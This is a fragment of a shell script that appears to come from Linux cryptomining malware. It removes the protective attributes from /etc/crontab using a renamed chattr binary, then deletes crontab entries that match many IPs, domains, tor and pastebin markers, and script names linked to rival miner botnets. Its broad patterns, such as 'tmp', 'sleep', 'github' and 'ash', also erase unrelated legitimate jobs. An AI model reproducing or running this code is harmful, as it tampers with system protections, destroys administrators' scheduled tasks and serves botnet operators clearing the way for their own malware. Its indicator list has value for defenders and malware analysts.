

mchattr -ia /etc/crontab 2>/dev/null



if type crontab 2>/dev/null 1>/dev/null; then 
crontab -l | sed '/#wget/d' | crontab -
crontab -l | sed '/#curl/d' | crontab -
crontab -l | grep -e "195.3.146.118" | grep -v grep
crontab -l | sed '/update.sh/d' | crontab -
crontab -l | sed '/logo4/d' | crontab -
crontab -l | sed '/logo9/d' | crontab -
crontab -l | sed '/logo0/d' | crontab -
crontab -l | sed '/logo/d' | crontab -
crontab -l | sed '/tor2web/d' | crontab -
crontab -l | sed '/jpg/d' | crontab -
crontab -l | sed '/png/d' | crontab -
crontab -l | sed '/tmp/d' | crontab -
crontab -l | sed '/zmreplchkr/d' | crontab -
crontab -l | sed '/aliyun.one/d' | crontab -
crontab -l | sed '/3.215.110.66.one/d' | crontab -
crontab -l | sed '/pastebin/d' | crontab -
crontab -l | sed '/onion/d' | crontab -
crontab -l | sed '/lsd.systemten.org/d' | crontab -
crontab -l | sed '/shuf/d' | crontab -
crontab -l | sed '/ash/d' | crontab -
crontab -l | sed '/mr.sh/d' | crontab -
crontab -l | sed '/185.181.10.234/d' | crontab -
crontab -l | sed '/localhost.xyz/d' | crontab -
crontab -l | sed '/45.137.151.106/d' | crontab -
crontab -l | sed '/111.90.159.106/d' | crontab -
crontab -l | sed '/github/d' | crontab -
crontab -l | sed '/bigd1ck.com/d' | crontab -
crontab -l | sed '/xmr.ipzse.com/d' | crontab -
crontab -l | sed '/185.181.10.234/d' | crontab -
crontab -l | sed '/146.71.79.230/d' | crontab -
crontab -l | sed '/122.51.164.83/d' | crontab -
crontab -l | sed '/newdat.sh/d' | crontab -
crontab -l | sed '/lib.pygensim.com/d' | crontab -
crontab -l | sed '/t.amynx.com/d' | crontab -
crontab -l | sed '/update.sh/d' | crontab -
crontab -l | sed '/systemd-service.sh/d' | crontab -
crontab -l | sed '/pg_stat.sh/d' | crontab -
crontab -l | sed '/sleep/d' | crontab -
crontab -l | sed '/oka/d' | crontab -
crontab -l | sed '/linux1213/d' | crontab -
crontab -l | sed '/zsvc/d' | crontab -
crontab -l | sed '/d.sh/d' | crontab -
fi
